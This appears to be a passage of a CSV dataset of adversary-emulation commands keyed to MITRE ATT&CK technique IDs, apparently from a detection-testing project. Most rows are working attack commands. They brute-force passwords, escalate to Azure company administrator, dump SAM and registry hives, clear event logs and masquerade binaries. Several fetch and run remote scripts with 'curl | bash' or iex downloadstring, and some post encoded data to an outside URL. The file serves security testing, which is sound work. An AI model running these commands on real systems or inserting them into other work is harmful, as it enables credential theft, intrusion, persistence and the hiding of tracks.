storage account."" } else { write-output ""fetching all blobs from container $($row.containername) in storage account $($row.storageaccountname) ..."" $connectionstring = az storage account show-connection-string --name $row.storageaccountname --resource-group $row.resourcegroup --query connectionstring --output tsv # create folder for storage account objects $storageaccountoutputpath = join-path #{output_folder} ""$($row.resourcegroup)_$($row.storageaccountname)"" if (-not (test-path -path $storageaccountoutputpath)) { new-item -itemtype directory -path $storageaccountoutputpath } # create folder for blob content $containerfolderpath = join-path $storageaccountoutputpath $row.containername if (-not (test-path -path $containerfolderpath)) { new-item -itemtype directory -path $containerfolderpath } az storage blob download-batch --destination $containerfolderpath --source $row.containername --connection-string $connectionstring } } }"
T1098,Azure AD - Add Company Administrator Role to a user,"import-module msonline $password = convertto-securestring -string ""#{password}"" -asplaintext -force $credential = new-object -typename system.management.automation.pscredential -argumentlist ""#{username}"", $password connect-msolservice -credential $credential add-msolrolemember -rolename ""company administrator"" -rolememberemailaddress ""#{target_user}"""
T1098,Simulate - Post BEC persistence via user password reset followed by user added to company administrator role,"import-module msonline import-module azuread $password = convertto-securestring -string ""#{auth_password}"" -asplaintext -force $credential = new-object -typename system.management.automation.pscredential -argumentlist ""#{auth_username}"", $password $targetsecurepw = convertto-securestring -string ""#{target_password}"" -asplaintext -force connect-msolservice -credential $credential -erroraction:silentlycontinue connect-azuread -credential $credential -erroraction:silentlycontinue #saving the objectid of the target_user into a variable $target_objid = get-azureaduser -filter ""userprincipalname eq '#{target_user}'"" | select-object -expandproperty objectid #reset the password of the target_user set-azureaduserpassword -objectid $target_objid -password $targetsecurepw -erroraction:silentlycontinue #adding target_user add-msolrolemember -rolename ""company administrator"" -rolememberemailaddress ""#{target_user}"" add-msolrolemember -rolename ""global reader"" -rolememberemailaddress ""#{target_user}"""
T1546,Set Arbitrary Binary as Screensaver,"reg export ""hkey_current_user\control panel\desktop"" %userprofile%\backup.reg copy #{input_binary} ""%systemroot%\system32\evilscreensaver.scr"" reg.exe add ""hkey_current_user\control panel\desktop"" /v screensaveactive /t reg_sz /d 1 /f reg.exe add ""hkey_current_user\control panel\desktop"" /v screensavetimeout /t reg_sz /d 60 /f reg.exe add ""hkey_current_user\control panel\desktop"" /v screensaverissecure /t reg_sz /d 0 /f reg.exe add ""hkey_current_user\control panel\desktop"" /v scrnsave.exe /t reg_sz /d ""%systemroot%\system32\evilscreensaver.scr"" /f if #{reboot} neq 0 shutdown /r /t 0"
T1110,Brute Force Credentials of single Active Directory domain users via SMB,"echo password1> passwords.txt echo 1q2w3e4r>> passwords.txt echo password!>> passwords.txt echo spring2022>> passwords.txt echo changeme!>> passwords.txt @for /f ""delims="" %p in (passwords.txt) do @net use %logonserver%\ipc$ /user:""%userdomain%\#{user}"" ""%p"" 1>nul 2>&1 && @echo [*] #{user}:%p && @net use /delete %logonserver%\ipc$ > nul"
T1110,Brute Force Credentials of single Active Directory domain user via LDAP against domain controller (NTLM or Kerberos),"if (""#{auth}"".tolower() -notin @(""ntlm"",""kerberos"")) { write-host ""only 'ntlm' and 'kerberos' auth methods are supported"" exit 1 } [system.reflection.assembly]::loadwithpartialname(""system.directoryservices.protocols"") | out-null $di = new-object system.directoryservices.protocols.ldapdirectoryidentifier(""#{domain}"",389) $passwordlist = get-content -path ""#{passwords_path}"" foreach ($password in $passwordlist){ $credz = new-object system.net.networkcredential(""#{user}"", $password, ""#{domain}"") $conn = new-object system.directoryservices.protocols.ldapconnection($di, $credz, [system.directoryservices.protocols.authtype]::#{auth}) try { write-host "" [-] attempting ${password} on account #{user}."" $conn.bind() # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success write-host "" [!] #{user}:${password} are valid credentials!"" } catch { write-host $_.exception.message } } write-host ""end of bruteforce"""
T1110,Brute Force Credentials of single Azure AD user,"import-module -name azuread $passwords = ""#{passwords}"".split(""{`n}"") foreach($password in $passwords) { $pword = convertto-securestring -string ""$password"" -asplaintext -force $credential = new-object -typename system.management.automation.pscredential -argumentlist ""#{username}"", $pword try { write-host "" [-] attempting ${password} on account #{username}."" connect-azuread -credential $credential 2>&1> $null # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success write-host "" [!] #{username}:${password} are valid credentials!`r`n"" break } catch { write-host "" [-] #{username}:${password} invalid credentials.`r`n"" } } write-host ""end of bruteforce"""
T1110,Password Brute User using Kerbrute Tool,"cd ""pathtoatomicsfolder\..\externalpayloads"" .\kerbrute.exe bruteuser --dc #{domaincontroller} -d #{domain} $env:temp\bruteuser.txt testuser1"
T1110,SUDO Brute Force - Debian,"useradd -g sudo -s /bin/bash -p $(openssl passwd -1 password123) art su -c ""cd /tmp; curl -s #{remote_url} | bash"" art"
T1110,SUDO Brute Force - Redhat,useradd -g wheel -s /bin/bash -p $(openssl passwd -1 password123) art su art cd /tmp curl -s #{remote_url} |bash
T1110,SUDO Brute Force - FreeBSD,"pw adduser art -g wheel -s /bin/sh echo ""password123"" | pw usermod art -h 0 su art cd /tmp curl -s #{remote_url} |bash"
T1110,ESXi - Brute Force Until Account Lockout,"$lockout_threshold = [int]""#{lockout_threshold}"" for ($var = 1; $var -le $lockout_threshold; $var++) { #{plink_file} -ssh ""#{vm_host}"" -l root -pw f0b443ae-9565-11ee-b9d1-0242ac120002 }"
T1543,Launch Daemon,sudo cp #{path_malicious_plist} /library/launchdaemons/#{plist_filename} sudo launchctl load -w /library/launchdaemons/#{plist_filename}
T1497,Detect Virtualization Environment (Linux),"if (systemd-detect-virt) then echo ""virtualization environment detected""; fi; if (sudo dmidecode | egrep -i 'manufacturer|product|vendor' | grep -ie 'oracle|virtualbox|vmware|parallels') then echo ""virtualization environment detected""; fi;"
T1497,Detect Virtualization Environment (FreeBSD),"if [ ""$(sysctl -n hw.hv_vendor)"" != """" ]; then echo ""virtualization environment detected""; fi"
T1497,Detect Virtualization Environment (Windows),"$error.clear() get-wmiobject -query ""select * from msacpi_thermalzonetemperature"" -erroraction silentlycontinue if($error) {echo ""virtualization environment detected""}"
T1497,Detect Virtualization Environment via ioreg,if (ioreg -l | grep -e manufacturer -e 'vendor name' | grep -ie 'oracle|virtualbox|vmware|parallels') then echo 'virtualization environment detected'; fi;
T1497,Detect Virtualization Environment via WMI Manufacturer/Model Listing (Windows),"$manufacturer = get-wmiobject -class win32_computersystem | select-object -expandproperty ""manufacturer"" $model = get-wmiobject -class win32_computersystem | select-object -expandproperty ""model"" if((($manufacturer.tolower() -eq ""microsoft corporation"") -and ($model.tolower().contains(""virtual""))) -or ($manufacturer.tolower().contains(""vmware"")) -or ($model.tolower() -eq ""virtualbox"")) {write-host ""virtualization environment detected!""} else {write-host ""no virtualization environment detected!""}"
T1497,Detect Virtualization Environment using sysctl (hw.model),"if [ ""$(sysctl -n hw.model | grep -v 'mac')"" != """" ]; then echo 'virtualization environment detected'; fi;"
T1497,Check if System Integrity Protection is enabled,"if [ ""$(csrutil status | grep -v 'enabled')"" != """" ]; then echo 'possible virtualization environment detected'; fi;"
T1497,Detect Virtualization Environment using system_profiler,"if [ ""$(system_profiler sphardwaredatatype | grep ""model identifier"" | grep -v 'mac')"" != """" ]; then echo 'virtualization environment detected'; fi;"
T1036,Execute a process from a directory masquerading as the current parent directory,"mkdir $home/... cp $(which sh) $home/... $home/.../sh -c ""echo #{test_message}"""
T1036,Masquerade as a built-in system executable,"add-type -typedefinition @' public class test { public static void main(string[] args) { system.console.writeline(""tweet, tweet""); } } '@ -outputassembly ""#{executable_filepath}"" start-process -filepath ""#{executable_filepath}"""
T1036,Masquerading cmd.exe as VEDetector.exe,"# copy and rename cmd.exe to vedetector.exe copy-item -path ""#{source_file}"" -destination ""#{ved_path}\vedetector.exe"" -force # create registry run key for persistence new-itemproperty -path ""hklm:\software\microsoft\windows\currentversion\run"" -name ""vedetector"" -value ""#{ved_path}\vedetector.exe"" -propertytype string -force # start the renamed process start-process -filepath ""#{ved_path}\vedetector.exe"" start-sleep -seconds 5"
T1218,Rundll32 execute JavaScript Remote Payload With GetObject,"rundll32.exe javascript:""\..\mshtml,runhtmlapplication "";document.write();getobject(""script:#{file_url}"").exec();window.close();"
T1218,Rundll32 execute VBscript command,"rundll32 vbscript:""\..\mshtml,runhtmlapplication ""+string(createobject(""wscript.shell"").run(""#{command_to_execute}""),0)"
T1218,Rundll32 execute VBscript command using Ordinal number,"rundll32 vbscript:""\..\mshtml,#135 ""+string(createobject(""wscript.shell"").run(""#{command_to_execute}""),0)"
T1218,Rundll32 advpack.dll Execution,"rundll32.exe advpack.dll,launchinfsection ""#{inf_to_execute}"",defaultinstall_singleuser,1,"
T1218,Rundll32 ieadvpack.dll Execution,"rundll32.exe ieadvpack.dll,launchinfsection ""#{inf_to_execute}"",defaultinstall_singleuser,1,"
T1218,Rundll32 syssetup.dll Execution,"rundll32.exe syssetup.dll,setupinfobjectinstallaction defaultinstall 128 ""#{inf_to_execute}"""
T1218,Rundll32 setupapi.dll Execution,"rundll32.exe setupapi.dll,installhinfsection defaultinstall 128 ""#{inf_to_execute}"""
T1218,Execution of HTA and VBS Files using Rundll32 and URL.dll,"rundll32.exe url.dll,openurl ""pathtoatomicsfolder\t1218.011\src\index.hta"" rundll32.exe url.dll,fileprotocolhandler ""pathtoatomicsfolder\t1218.011\src\akteullen.vbs"""
T1218,Launches an executable using Rundll32 and pcwutl.dll,"rundll32.exe pcwutl.dll,launchapplication #{exe_to_launch}"
T1218,Execution of non-dll using rundll32.exe,"rundll32.exe #{input_file}, startw"
T1218,Rundll32 with Ordinal Value,"rundll32.exe ""#{input_file}"",#2"
T1218,Rundll32 with Control_RunDLL,"rundll32.exe shell32.dll,control_rundll ""#{input_file}"""
T1218,Rundll32 with desk.cpl,"copy #{exe_to_launch} not_an_scr.scr rundll32.exe desk.cpl,installscreensaver not_an_scr.scr"
T1218,Running DLL with .init extension and function,"rundll32.exe #{dll_file},krnl"
T1218,Rundll32 execute command via FileProtocolHandler,"rundll32.exe url.dll,fileprotocolhandler #{command_to_execute}"
T1218,Rundll32 execute payload by calling RouteTheCall,"rundll32.exe zipfldr.dll,routethecall ""#{exe_to_launch}"""
T1496,FreeBSD/macOS/Linux - Simulate CPU Load with Yes,yes > /dev/null
T1652,Device Driver Discovery,driverquery /v /fo list driverquery /si /fo list
T1652,Device Driver Discovery (Linux),lsmod
T1652,Enumerate Kernel Driver Files (Linux),"find /lib/modules/$(uname -r)/kernel/drivers -name ""*.ko*"""
T1652,List loaded kernel extensions (macOS),kextstat
T1652,Find Kernel Extensions (macOS),kextfind
T1132,Base64 Encoded data.,echo -n 111-11-1111 | base64 curl -xpost #{base64_data}.#{destination_url}
T1132,Base64 Encoded data (freebsd),echo -n 111-11-1111 | b64encode -r - curl -xpost #{base64_data}.#{destination_url}
T1132,XOR Encoded data.,"$plaintext = ([system.text.encoding]::utf8.getbytes(""#{plaintext}"")) $key = ""#{key}"" $cyphertext = @(); for ($i = 0; $i -lt $plaintext.count; $i++) { $cyphertext += $plaintext[$i] -bxor $key[$i % $key.length]; } $cyphertext = [system.text.encoding]::utf8.getstring($cyphertext) [system.net.servicepointmanager]::expect100continue = $false invoke-webrequest -uri #{destination_url} -method post -body $cyphertext -disablekeepalive"
T1036,File Extension Masquerading,"copy ""#{exe_path}"" %temp%\t1036.007_masquerading.docx.exe /y copy ""#{exe_path}"" %temp%\t1036.007_masquerading.pdf.exe /y copy ""#{exe_path}"" %temp%\t1036.007_masquerading.ps1.exe /y copy ""#{vbs_path}"" %temp%\t1036.007_masquerading.xls.vbs /y copy ""#{vbs_path}"" %temp%\t1036.007_masquerading.xlsx.vbs /y copy ""#{vbs_path}"" %temp%\t1036.007_masquerading.png.vbs /y copy ""#{ps1_path}"" %temp%\t1036.007_masquerading.doc.ps1 /y copy ""#{ps1_path}"" %temp%\t1036.007_masquerading.pdf.ps1 /y copy ""#{ps1_path}"" %temp%\t1036.007_masquerading.rtf.ps1 /y %temp%\t1036.007_masquerading.docx.exe %temp%\t1036.007_masquerading.pdf.exe %temp%\t1036.007_masquerading.ps1.exe %temp%\t1036.007_masquerading.xls.vbs %temp%\t1036.007_masquerading.xlsx.vbs %temp%\t1036.007_masquerading.png.vbs c:\windows\system32\windowspowershell\v1.0\powershell.exe -file %temp%\t1036.007_masquerading.doc.ps1 c:\windows\system32\windowspowershell\v1.0\powershell.exe -file %temp%\t1036.007_masquerading.pdf.ps1 c:\windows\system32\windowspowershell\v1.0\powershell.exe -file %temp%\t1036.007_masquerading.rtf.ps1"
T1219,TeamViewer Files Detected Test on Windows,"invoke-webrequest -outfile c:\users\$env:username\desktop\teamviewer_setup.exe https://download.teamviewer.com/download/teamviewer_setup.exe $file1 = ""c:\users\"" + $env:username + ""\desktop\teamviewer_setup.exe"" start-process -wait $file1 /s; start-process 'c:\program files (x86)\teamviewer\teamviewer.exe'"
T1219,AnyDesk Files Detected Test on Windows,"invoke-webrequest -outfile c:\users\$env:username\desktop\anydesk.exe https://download.anydesk.com/anydesk.exe $file1 = ""c:\users\"" + $env:username + ""\desktop\anydesk.exe"" start-process $file1 /s;"
T1219,LogMeIn Files Detected Test on Windows,"invoke-webrequest -outfile c:\users\$env:username\desktop\logmeinignition.msi https://secure.logmein.com/logmeinignition.msi $file1 = ""c:\users\"" + $env:username + ""\desktop\logmeinignition.msi"" start-process -wait $file1 /quiet; start-process 'c:\program files (x86)\logmein ignition\lmiignition.exe' ""/s"""
T1219,GoToAssist Files Detected Test on Windows,"invoke-webrequest -outfile c:\users\$env:username\downloads\gotoassist.exe ""https://launch.getgo.com/launcher2/helper?token=e0-facddxmtmox8_cy4czssntegvy83ihp8clrefvwqshibw0_rcbdoaep8ia-qn8wpbklpgifls-39gw6ruwrm-xhwtkrvmlbsp5rskp-a3pbm-pb1fliy73edgoaxr-q83wtxblkqd7-u3cfdl9gksymmhdktgsxcdxir90nqkj92lsn_kpyywv06lixsdrekhnzjnwhkwrba_hg8rqjqwsgk6tkzlvmumufmn37ec2cqqiwq5bcgnh5dyisuusklsedrljh4n46qpyt1bau0qd25zpr-kvf4kzu9bt02q3yntj02za99txl2-skzgryizoopbpg4ilfo5t78uxktyeewo4etqecfkcrvenktrlihmowdbd88zz7niccxnbhjzehgs6_-jsvjqidptxzbf9t5z44mi4bqymtzas3de86f0c3d4tcd7fa5f6ve8rqwt7pvqfcyyijaailslxow0lsgyfokoy65tmf980rep8zhvctkyp8s8mhgxihuqjqpnk20sw&downloadtrigger=restart&renamefile=1"" $file1 = ""c:\users\"" + $env:username + ""\downloads\gotoassist.exe"" start-process $file1 /s;"
T1219,ScreenConnect Application Download and Install on Windows,"$installer = ""c:\users\$env:username\downloads\screenconnect.msi"" invoke-webrequest -outfile $installer ""https://d1kuyuqowve5id.cloudfront.net/screenconnect_25.1.10.9197_release.msi"" msiexec /i $installer /qn"
T1219,Ammyy Admin Software Execution,"start-process ""#{ammyy_admin_path}"""
T1219,RemotePC Software Execution,"start-process ""#{remotepc_path}"""
T1219,NetSupport - RAT Execution,"start-process ""#{netsupport_path}"" -argumentlist ""/s /v/qn"""
T1219,UltraViewer - RAT Execution,"start-process -wait -filepath ""#{ultraviewer_path}"" -argument ""/silent"" -passthru start-process 'c:\program files (x86)\ultraviewer\ultraviewer_desktop.exe'"
T1219,UltraVNC Execution,start-process #{ultravnc_viewer_path}
T1219,MSP360 Connect Execution,start-process #{msp360_connect_path}
T1219,RustDesk Files Detected Test on Windows,"$file = join-path $env:userprofile ""desktop\rustdesk-1.2.3-1-x86_64.exe"" invoke-webrequest -outfile $file https://github.com/rustdesk/rustdesk/releases/download/1.2.3-1/rustdesk-1.2.3-1-x86_64.exe start-process -filepath $file ""/s"""
T1219,Splashtop Execution,"start-process ""#{splashtop_path}"""
T1219,Splashtop Streamer Execution,"start-process -filepath ""c:program files (x86)\splashtop\splashtop remote\server\#{srserver_exe}"""
T1219,Microsoft App Quick Assist Execution,"start-process ""shell:appsfolder\microsoftcorporationii.quickassist_8wekyb3d8bbwe!app"""
T1559,Cobalt Strike Artifact Kit pipe,"""pathtoatomicsfolder\..\externalpayloads\build\namedpipes_executor.exe"" --pipe 1"
T1559,Cobalt Strike Lateral Movement (psexec_psh) pipe,"""pathtoatomicsfolder\..\externalpayloads\build\namedpipes_executor.exe"" --pipe 2"
T1559,Cobalt Strike SSH (postex_ssh) pipe,"""pathtoatomicsfolder\..\externalpayloads\build\namedpipes_executor.exe"" --pipe 3"
T1559,Cobalt Strike post-exploitation pipe (4.2 and later),"""pathtoatomicsfolder\..\externalpayloads\build\namedpipes_executor.exe"" --pipe 4"
T1559,Cobalt Strike post-exploitation pipe (before 4.2),"""pathtoatomicsfolder\..\externalpayloads\build\namedpipes_executor.exe"" --pipe 5"
T1083,File and Directory Discovery (cmd.exe),"dir /s c:\ >> #{output_file} dir /s ""c:\documents and settings"" >> #{output_file} dir /s ""c:\program files\"" >> #{output_file} dir ""%systemdrive%\users\*.*"" >> #{output_file} dir ""%userprofile%\appdata\roaming\microsoft\windows\recent\*.*"" >> #{output_file} dir ""%userprofile%\desktop\*.*"" >> #{output_file} tree /f >> #{output_file}"
T1083,File and Directory Discovery (PowerShell),ls -recurse get-childitem -recurse gci -recurse
T1083,Nix File and Directory Discovery,"ls -a >> #{output_file} if [ -d /library/preferences/ ]; then ls -la /library/preferences/ > #{output_file}; fi; file */* *>> #{output_file} cat #{output_file} 2>/dev/null find . -type f ls -r | grep "":$"" | sed -e 's/:$//' -e 's/[^-][^\/]*\//--/g' -e 's/^/ /' -e 's/-/|/' locate * which sh"
T1083,Nix File and Directory Discovery 2,"cd $home && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' > #{output_file} if [ -f /etc/mtab ]; then cat /etc/mtab >> #{output_file}; fi; find . -type f -iname *.pdf >> #{output_file} cat #{output_file} find . -type f -name "".*"""
T1083,Simulating MAZE Directory Enumeration,"$folderarray = @(""desktop"", ""downloads"", ""documents"", ""appdata/local"", ""appdata/roaming"") get-childitem -path $env:homedrive -erroraction silentlycontinue | out-file -append #{file_to_output} get-childitem -path $env:programfiles -erroraction silentlycontinue | out-file -append #{file_to_output} get-childitem -path ""${env:programfiles(x86)}"" -erroraction silentlycontinue | out-file -append #{file_to_output} $usersfolder = ""$env:homedrive\users\"" foreach ($directory in get-childitem -path $usersfolder -erroraction silentlycontinue) { foreach ($secondarydirectory in $folderarray) {get-childitem -path ""$usersfolder/$directory/$secondarydirectory"" -erroraction silentlycontinue | out-file -append #{file_to_output}} } cat #{file_to_output}"
T1083,Launch DirLister Executable,"start-process ""#{dirlister_path}"" start-sleep -second 4 stop-process -name ""dirlister"""
T1083,ESXi - Enumerate VMDKs available on an ESXi Host,"echo """" | ""#{plink_file}"" ""#{vm_host}"" -ssh -l ""#{vm_user}"" -pw ""#{vm_pass}"" -m ""#{cli_script}"""
T1083,Identifying Network Shares - Linux,findmnt -t nfs
T1083,Recursive Enumerate Files And Directories By Powershell,"$out = ""#{output_file}"" $dirsfilter = @('documents','downloads','desktop','onedrive') $exts = @('.pdf','.doc','.docx','.xls','.xlsx','.txt','.zip','.rar','.7z') $userprofile = [environment]::getfolderpath('userprofile') $tr = [system.collections.generic.list[string]]::new() function matchesextension($path) { try { $e = [system.io.path]::getextension($path).tolower() return $exts -contains $e } catch { return $false } } function scan-dir($root) { try { $match = $false foreach ($f in $dirsfilter) { if ($root -like ""*$f*"") { $match = $true; break } } if (-not $match) { return } [system.io.directory]::enumeratefiles($root) | foreach-object { if (matchesextension $_) { $fi = [system.io.fileinfo]::new($_) $tr.add(""[file] $_ size:$($fi.length) lastwrite:$($fi.lastwritetime)"") } } [system.io.directory]::enumeratedirectories($root) | foreach-object { scan-dir $_ } } catch [system.unauthorizedaccessexception] { $tr.add(""[accessdenied] $root"") } catch { $tr.add(""[error] $root => $($_.exception.message)"") } } [system.io.directory]::enumeratedirectories($userprofile) | foreach-object { scan-dir $_ } # ensure output dir exists $outdir = [system.io.path]::getdirectoryname($out) if (-not [string]::isnullorempty($outdir) -and -not (test-path $outdir)) { new-item -path $outdir -itemtype directory -force | out-null } # write results $tr | out-file -filepath $out -encoding utf8 write-output ""enumeration complete. results written to: $out"""
T1518,Find and Display Internet Explorer Browser Version,"reg query ""hkey_local_machine\software\microsoft\internet explorer"" /v svcversion"
T1518,Applications Installed,"get-itemproperty hklm:\software\microsoft\windows\currentversion\uninstall\* | select-object displayname, displayversion, publisher, installdate | format-table -autosize get-itemproperty hklm:\software\wow6432node\microsoft\windows\currentversion\uninstall\* | select-object displayname, displayversion, publisher, installdate | format-table -autosize"
T1518,Find and Display Safari Browser Version,"/usr/libexec/plistbuddy -c ""print :cfbundleshortversionstring"" /applications/safari.app/contents/info.plist /usr/libexec/plistbuddy -c ""print :cfbundleversion"" /applications/safari.app/contents/info.plist"
T1518,WinPwn - Dotnetsearch,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') dotnetsearch -noninteractive -consoleoutput
T1518,WinPwn - DotNet,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') dotnet -consoleoutput -noninteractive
T1518,WinPwn - powerSQL,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') powersql -noninteractive -consoleoutput
T1003,"Registry dump of SAM, creds, and secrets",reg save hklm\sam %temp%\sam reg save hklm\system %temp%\system reg save hklm\security %temp%\security
T1003,Registry parse with pypykatz,"""#{venv_path}\scripts\pypykatz"" live lsa"
T1003,esentutl.exe SAM copy,esentutl.exe /y /vss #{file_path} /d #{copy_dest}/#{file_name}
T1003,PowerDump Hashes and Usernames from Registry,"write-host ""starting to set bypass and disable defender realtime mon"" -fore green import-module ""pathtoatomicsfolder\..\externalpayloads\powerdump.ps1"" invoke-powerdump"
T1003,dump volume shadow copy hives with certutil,"for /l %a in (1,1,#{limit}) do @(certutil -f -v -encodehex ""\\?\globalroot\device\harddiskvolumeshadowcopy%a\windows\system32\config\#{target_hive}"" %temp%\#{target_hive}vss%a 2 >nul 2>&1) & dir /b %temp%\#{target_hive}vss*"
T1003,dump volume shadow copy hives with System.IO.File,"1..#{limit} | % { try { [system.io.file]::copy(""\\?\globalroot\device\harddiskvolumeshadowcopy$_\windows\system32\config\#{target_hive}"" , ""$env:temp\#{target_hive}vss$_"", ""true"") } catch {} ls ""$env:temp\#{target_hive}vss$_"" -erroraction ignore }"
T1003,WinPwn - Loot local Credentials - Dump SAM-File for NTLM Hashes,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') samfile -consoleoutput -noninteractive
T1003,"Dumping of SAM, creds, and secrets(Reg Export)",reg export hklm\sam %temp%\sam reg export hklm\system %temp%\system reg export hklm\security %temp%\security
T1218,Odbcconf.exe - Execute Arbitrary DLL,"odbcconf.exe /s /a {regsvr ""#{dll_payload}""}"
T1218,Odbcconf.exe - Load Response File,"cd ""#{rsp_file_path}"" odbcconf.exe -f ""#{rsp_file_name}"""
T1552,Azure - Search Azure AD User Attributes for Passwords,"import-module msonline $password = convertto-securestring -string ""#{password}"" -asplaintext -force $credential = new-object -typename system.management.automation.pscredential -argumentlist ""#{username}"", $password connect-msolservice -credential $credential $users = get-msoluser -all; foreach($user in $users) {$props = @();$user | get-member | foreach-object{$props+=$_.name}; foreach($prop in $props) {if($user.$prop -like ""*password*"") {(""[*]"" + $user.userprincipalname + ""["" + $prop + ""]"" + "" : "" + $user.$prop) | out-file -filepath $env:temp\t1552.005test1.txt -append -force}}} get-content -path $env:temp\t1552.005test1.txt -erroraction silentlycontinue"
T1552,Azure - Dump Azure Instance Metadata from Virtual Machines,"invoke-restmethod -headers @{""metadata""=""true""} -method get -uri ""http://169.254.169.254/metadata/instance?api-version=2021-02-01"" | convertto-json -depth 64 > #{output_file}"
T1070,Clear Logs,wevtutil cl #{log_name}
T1070,Delete System Logs Using Clear-EventLog,$logs = get-eventlog -list | foreach-object {$_.log} $logs | foreach-object {clear-eventlog -logname $_ } get-eventlog -list
T1070,Clear Event Logs via VBA,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1204.002/src/invoke-maldoc.ps1"" -usebasicparsing) invoke-maldoc -macrofile ""pathtoatomicsfolder\t1070.001\src\t1070.001-macrocode.txt"" -officeproduct ""word"" -sub ""clearlogs"""
T1217,List Mozilla Firefox Bookmark Database Files on FreeBSD/Linux,"find / -path ""*.mozilla/firefox/*/places.sqlite"" 2>/dev/null -exec echo {} >> #{output_file} \; cat #{output_file} 2>/dev/null"
T1217,List Mozilla Firefox Bookmark Database Files on macOS,"find / -path ""*/firefox/profiles/*/places.sqlite"" -exec echo {} >> #{output_file} \; cat #{output_file} 2>/dev/null"
T1217,List Google Chrome Bookmark JSON Files on macOS,"find / -path ""*/google/chrome/*/bookmarks"" -exec echo {} >> #{output_file} \; cat #{output_file} 2>/dev/null"
T1217,List Google Chromium Bookmark JSON Files on FreeBSD,"find / -path ""*/.config/chromium/*/bookmarks"" -exec echo {} >> #{output_file} \; cat #{output_file} 2>/dev/null"
T1217,List Google Chrome / Opera Bookmarks on Windows with powershell,get-childitem -path c:\users\ -filter bookmarks -recurse -erroraction silentlycontinue -force
T1217,List Google Chrome / Edge Chromium Bookmarks on Windows with command prompt,where /r c:\users\ bookmarks
T1217,List Mozilla Firefox bookmarks on Windows with command prompt,where /r c:\users\ places.sqlite
T1217,List Internet Explorer Bookmarks using the command prompt,dir /s /b %userprofile%\favorites
T1217,List Safari Bookmarks on MacOS,"find / -path ""*/safari/bookmarks.plist"" 2>/dev/null >> #{output_file} cat #{output_file}"
T1217,Extract Edge Browsing History,"$url_regex = '(htt(p|s))://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?' $history = get-content -path ""#{history_path}"" | select-string -allmatches $url_regex | foreach-object { $_.matches.value } | sort -unique $history | out-file -filepath ""#{dest_path}"""
T1217,Extract chrome Browsing History,"$username = (whoami).split('\')[1] $url_regex = '(htt(p|s))://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?' $history = get-content -path ""$env:systemdrive\users\$username\appdata\local\google\chrome\user data\default\history"" | select-string -allmatches $url_regex | foreach-object { $_.matches.value } | sort -unique $history | out-file -filepath ""$env:userprofile\downloads\chromebrowsinghistory.txt"""
T1489,Windows - Stop service using Service Controller,sc.exe stop #{service_name}
T1489,Windows - Stop service using net.exe,net.exe stop #{service_name}
T1489,Windows - Stop service by killing process,taskkill.exe /f /im #{process_name}
T1489,Linux - Stop service using systemctl,sudo systemctl stop #{service_name}
T1489,Linux - Stop service by killing process using killall,sudo killall -sigterm #{process_name}
T1489,Linux - Stop service by killing process using kill,sudo kill -sigterm $(pgrep #{process_name})
T1489,Linux - Stop service by killing process using pkill,sudo pkill -sigterm #{process_pattern}
T1489,Abuse of linux magic system request key for Send a SIGTERM to all processes,"echo ""e"" > /proc/sysrq-trigger"
T1218,Msiexec.exe - Execute Local MSI file with embedded JScript,"#{msi_exe} /q /#{action} ""#{msi_payload}"""
T1218,Msiexec.exe - Execute Local MSI file with embedded VBScript,"#{msi_exe} /q /#{action} ""#{msi_payload}"""
T1218,Msiexec.exe - Execute Local MSI file with an embedded DLL,"#{msi_exe} /q /#{action} ""#{msi_payload}"""
T1218,Msiexec.exe - Execute Local MSI file with an embedded EXE,"#{msi_exe} /q /#{action} ""#{msi_payload}"""
T1218,WMI Win32_Product Class - Execute Local MSI file with embedded JScript,invoke-cimmethod -classname win32_product -methodname #{action} -arguments @{ packagelocation = '#{msi_payload}' }
T1218,WMI Win32_Product Class - Execute Local MSI file with embedded VBScript,invoke-cimmethod -classname win32_product -methodname #{action} -arguments @{ packagelocation = '#{msi_payload}' }
T1218,WMI Win32_Product Class - Execute Local MSI file with an embedded DLL,invoke-cimmethod -classname win32_product -methodname #{action} -arguments @{ packagelocation = '#{msi_payload}' }
T1218,WMI Win32_Product Class - Execute Local MSI file with an embedded EXE,invoke-cimmethod -classname win32_product -methodname #{action} -arguments @{ packagelocation = '#{msi_payload}' }
T1218,Msiexec.exe - Execute the DllRegisterServer function of a DLL,"#{msi_exe} /y ""#{dll_payload}"""
T1218,Msiexec.exe - Execute the DllUnregisterServer function of a DLL,"#{msi_exe} /z ""#{dll_payload}"""
T1218,Msiexec.exe - Execute Remote MSI file,"#{msi_exe} /q /i ""#{msi_payload}"""
T1526,Azure - Dump Subscription Data with MicroBurst,"import-module ""pathtoatomicsfolder\..\externalpayloads\get-azdomaininfo.ps1"" $password = convertto-securestring -string ""#{password}"" -asplaintext -force $credential = new-object -typename system.management.automation.pscredential -argumentlist ""#{username}"", $password connect-azaccount -credential $credential | out-null get-azdomaininfo -folder #{output_directory} -subscription ""#{subscription_name}"" -verbose"
T1526,AWS - Enumerate common cloud services,"import-module ""pathtoatomicsfolder\t1526\src\awsdiscovery.ps1"" $access_key = ""#{access_key}"" $secret_key = ""#{secret_key}"" $session_token = ""#{session_token}"" $aws_profile = ""#{profile}"" $regions = ""#{regions}"" set-awsauthentication -accesskey $access_key -secretkey $secret_key -sessiontoken $session_token -awsprofile $aws_profile get-awsdiscoverydata -regions $regions -outputdirectory ""#{output_directory}"" remove-blankfiles -outputdirectory ""#{output_directory}"""
